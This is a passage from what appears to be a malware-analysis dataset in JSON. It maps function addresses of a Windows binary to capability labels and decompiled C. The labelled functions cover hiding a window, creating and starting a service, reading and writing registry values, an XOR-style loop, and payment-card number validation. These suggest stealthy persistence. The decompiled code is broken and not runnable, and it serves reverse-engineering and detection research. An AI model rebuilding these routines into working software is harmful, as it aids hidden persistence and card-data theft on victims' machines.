        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004042c0(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 103
    },
    "00402ec0": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00402ec0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n    return 1;\n}\n",
        "token_count": 97
    },
    "00403e20": {
        "rules": [
            "create or open registry key"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403e83) overlaps instruction at (ram,0x00403e82)\n// \n// WARNING: Removing unreachable block (ram,0x00403ea6)\n// WARNING: Removing unreachable block (ram,0x00403eae)\n\nuint __fastcall\nfcn.00403e20(int32_t param_1, char param_2, uint param_3, uint param_4, uint param_5, uint param_6, uint param_7, \n            uint param_8)\n\n{\n    int32_t *piVar1;\n    uint8_t *puVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    uint32_t in_EAX;\n    int32_t iVar5;\n    int32_t unaff_EBX;\n    uint uVar6;\n    bool in_CF;\n    bool bVar7;\n    uint8_t in_AF;\n    bool in_ZF;\n    int32_t iStack8;\n    \n    uVar6 = 1;\n    iStack8 = param_1;\n    if ((!in_ZF) && (in_ZF)) {\n        uVar4 = in_EAX;\n        if (in_CF || unaff_EBX + 1 == 0) {\n            bVar7 = uVar4 < 0x8b || uVar4 + 0x75 < in_CF;\n            puVar2 = unaff_EBX + -0x74afebaa;\n            uVar4 = *puVar2;\n            uVar3 = *puVar2 - param_1;\n            *puVar2 = uVar3 - bVar7;\n            *(param_1 + -0x75) = *(param_1 + -0x75) + param_2 + (uVar4 < param_1 || uVar3 < bVar7);\n            goto code_r0x00403e62;\n        }\n        uVar3 = 9 < (uVar4 & 0xf) | in_AF;\n        piVar1 = (in_EAX & 0xffff0000 | CONCAT11((in_EAX >> 8) + uVar3, uVar4 + uVar3 * '\\x06') & 0xff0f) + 0x2a;\n        *piVar1 = *piVar1 - (unaff_EBX + 1);\n        uVar6 = 2;\n    }\n    iVar5 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(param_3, param_4, 0, 0xf003f, &iStack8);\n    if (iVar5 != 0) {\n        return 0;\n    }\ncode_r0x00403e62:\n    iVar5 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(iStack8, param_5, 0, param_6, param_7, param_8);\n    if (iVar5 != 0) {\n        uVar6 = 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(iStack8);\n    return uVar6;\n}\n",
        "token_count": 675
    },
    "00403130": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00403130(int32_t noname_0, int32_t noname_1, int32_t noname_2, int32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint8_t unaff_BL;\n    int32_t iVar4;\n    bool bVar5;\n    float10 in_ST0;\n    float10 in_ST1;\n    float10 in_ST2;\n    float10 in_ST3;\n    float10 in_ST4;\n    float10 in_ST5;\n    float10 in_ST6;\n    float10 in_ST7;\n    int32_t in_stack_00000014;\n    uint var_10h;\n    int32_t iStack16;\n    int32_t var_8h;\n    \n    var_8h = 0;\n    if (0 < arg_14h) {\n        iStack16 = 1;\n        iVar3 = arg_14h * 2;\n        do {\n            uVar1 = *(var_8h + noname_2);\n            uVar2 = *(iStack16 % noname_1 + noname_0);\n            bVar5 = -1 < (iVar3 >> 8 ^ unaff_BL) << 8;\n            iVar3 = iStack16;\n            iVar4 = noname_1;\n            if ((bVar5) && (!bVar5)) {\n                *(noname_1 + 0x1c) = in_ST0;\n                iVar4 = noname_1 + 5;\n                iVar3 = iStack16 + 5;\n                in_ST0 = in_ST1;\n                in_ST1 = in_ST2;\n                in_ST2 = in_ST3;\n                in_ST3 = in_ST4;\n                in_ST4 = in_ST5;\n                in_ST5 = in_ST6;\n                in_ST6 = in_ST7;\n            }\n            var_10h._0_1_ = arg_14h * 2;\n            *(in_stack_00000014 + -1 + iStack16) = var_10h ^ uVar1 ^ *((iVar3 + -1) % iVar4 + noname_0);\n            *(iStack16 + in_stack_00000014) = var_10h ^ uVar2;\n            iVar3 = var_8h + 1;\n            iStack16 = iStack16 + 2;\n            var_8h = iVar3;\n            unaff_BL = uVar2;\n        } while (iVar3 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 587
    },
    "00401490": {
        "rules": [
            "get service handle",
            "start service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401490(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar2, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar3 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 != 0x420) {\n            iVar3 = (*pcVar1)();\n            if (iVar3 != 0x422) {\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n                return 0;\n            }\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 241
    },
    "00404d40": {
        "rules": [
            "get service handle",
            "create service"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404d93) overlaps instruction at (ram,0x00404d92)\n// \n// WARNING: Removing unreachable block (ram,0x00404d83)\n\nuint __cdecl fcn.00404d40(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    bool in_CF;\n    bool in_ZF;\n    \n    if ((!in_CF && !in_ZF) && (in_CF || in_ZF)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)(arg_8h, arg_ch, arg_ch, 0xf01ff, 1, 0, 1, arg_10h, 0, 0, 0, 0, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 239
    },
    "004029d0": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.004029d0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4071d8, 0x40721c, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 81
    },
    "004042f0": {
        "rules": [
            "query or enumerate registry value"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404375) overlaps instruction at (ram,0x00404372)\n// \n// WARNING: Removing unreachable block (ram,0x0040433a)\n// WARNING: Removing unreachable block (ram,0x00404325)\n// WARNING: Removing unreachable block (ram,0x0040436c)\n\nbool fcn.004042f0(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar pvData;\n    uint var_10bh;\n    uint pdwType;\n    uint pcbData;\n    \n    pvData = 0;\n    pcbData = 0x104;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)(0x80000002, 0x407460, 0x407488, &pdwType, &pvData, &pcbData);\n    if (iVar2 != 0) {\n        return false;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    puVar1 = (*_sym.imp.MSVCRT.dll_strchr)(&pvData, 0x2e);\n    if (puVar1 == NULL) {\n        return false;\n    }\n    if ((0 < puVar1) && (puVar1 < 1)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    *puVar1 = 0;\n    iVar2 = (*_sym.imp.MSVCRT.dll_atoi)(&pvData);\n    if (iVar2 == 6) {\n        return true;\n    }\n    return iVar2 == 7;\n}\n",
        "token_count": 457
    }
}